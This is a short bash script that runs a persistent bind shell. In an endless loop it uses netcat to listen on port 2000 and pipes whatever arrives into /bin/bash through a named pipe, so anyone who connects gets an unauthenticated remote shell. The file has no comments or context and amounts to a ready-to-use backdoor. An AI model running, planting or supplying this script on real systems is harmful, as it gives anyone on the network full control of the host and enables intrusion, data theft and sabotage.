#!/bin/bash

PORT=2000
while true; do
    FIFO=$(mktemp -u)
    mkfifo $FIFO
    nc -lvp $PORT < $FIFO | /bin/bash > $FIFO 2>&1
    rm $FIFO
done
